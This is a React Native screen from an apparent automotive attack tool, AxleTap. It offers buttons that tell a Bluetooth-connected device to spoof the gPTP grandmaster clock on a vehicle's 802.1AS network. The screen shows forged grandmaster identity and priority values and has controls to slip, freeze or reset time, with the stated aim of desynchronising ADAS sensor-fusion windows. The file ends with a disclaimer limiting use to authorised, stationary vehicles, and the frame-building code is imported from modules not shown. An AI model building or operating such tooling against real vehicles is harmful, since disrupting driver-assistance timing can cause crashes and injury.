// GptpScreen.js — gPTP grandmaster spoofing controls
// Author: jayis1
// License: MIT
// Date:   2026-07-22

import React, { useState } from 'react';
import { View, Text, StyleSheet, TextInput, TouchableOpacity, Alert } from 'react-native';
import * as Ble from '../utils/ble';
import * as Proto from '../utils/protocol';

export default function GptpScreen() {
  const [slipPpb, setSlipPpb] = useState('-1000');
  const [observedGm, setObservedGm] = useState('—');
  const [mode, setMode] = useState('PASSIVE');

  const send = async (frame, label) => {
    const ok = await Ble.sendCommand(frame);
    if (!ok) Alert.alert('Error', `Failed: ${label}`);
    else setMode(label);
  };

  return (
    <View style={styles.container}>
      <View style={styles.section}>
        <Text style={styles.h2}>Current Mode</Text>
        <Text style={styles.text}>gPTP mode: {mode}</Text>
        <Text style={styles.text}>Observed GM identity: {observedGm}</Text>
        <Text style={styles.text}>Forged GM identity: 00:00:00:FF:FE:00:00:01</Text>
        <Text style={styles.text}>Forged priority1: 0x00 (highest)</Text>
        <Text style={styles.text}>Forged clockClass: 0x06 (primary reference)</Text>
      </View>

      <View style={styles.section}>
        <Text style={styles.h2}>Grandmaster spoof</Text>
        <Text style={styles.text}>
          Become the best clock on the 802.1AS domain. All ECUs will
          synchronize to AxleTap's forged time.
        </Text>
        <TouchableOpacity style={[styles.btn, styles.danger]} onPress={() => send(Proto.cmdGptpGm(), 'GM')}>
          <Text style={styles.btnText}>Start GM spoof</Text>
        </TouchableOpacity>
      </View>

      <View style={styles.section}>
        <Text style={styles.h2}>Time slip</Text>
        <Text style={styles.text}>
          Gradually shift the time base to desync ADAS sensor-fusion windows.
        </Text>
        <View style={styles.row}>
          <TextInput
            style={styles.input}
            value={slipPpb}
            onChangeText={setSlipPpb}
            keyboardType="numeric"
            placeholder="ppb"
          />
          <TouchableOpacity style={styles.btn} onPress={() => send(Proto.cmdGptpSlip(parseInt(slipPpb, 10)), 'SLIP')}>
            <Text style={styles.btnText}>Apply slip</Text>
          </TouchableOpacity>
        </View>
      </View>

      <View style={styles.section}>
        <Text style={styles.h2}>Freeze / Jump / Reset</Text>
        <View style={styles.row}>
          <TouchableOpacity style={[styles.btn, styles.danger]} onPress={() => send(Proto.cmdGptpFreeze(), 'FREEZE')}>
            <Text style={styles.btnText}>Freeze time</Text>
          </TouchableOpacity>
          <TouchableOpacity style={styles.btn} onPress={() => send(Proto.cmdGptpReset(), 'PASSIVE')}>
            <Text style={styles.btnText}>Reset to passive</Text>
          </TouchableOpacity>
        </View>
      </View>

      <View style={styles.disclaimer}>
        <Text style={styles.warn}>
          ⚠ gPTP grandmaster spoofing can cause ADAS / autonomous driving
          misbehavior. Deploy only on a stationary, authorized vehicle.
          Never operate on public roads.
        </Text>
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#121212' },
  section: { padding: 14, borderBottomWidth: 1, borderBottomColor: '#2a2a2a' },
  row: { flexDirection: 'row', alignItems: 'center', marginTop: 8 },
  h2: { color: '#7ab8ff', fontSize: 14, fontWeight: 'bold', marginBottom: 6 },
  text: { color: '#ddd', fontSize: 12, fontFamily: 'monospace', marginVertical: 2 },
  btn: {
    backgroundColor: '#2a4d6e', paddingHorizontal: 14, paddingVertical: 8,
    borderRadius: 4, marginRight: 8, marginBottom: 8,
  },
  danger: { backgroundColor: '#aa3333' },
  btnText: { color: '#fff', fontSize: 12, fontWeight: 'bold' },
  input: {
    borderWidth: 1, borderColor: '#444', color: '#eee',
    paddingHorizontal: 10, paddingVertical: 6, borderRadius: 4,
    marginRight: 8, width: 100, fontFamily: 'monospace',
  },
  disclaimer: { padding: 14 },
  warn: { color: '#ff6677', fontSize: 11, fontFamily: 'monospace' },
});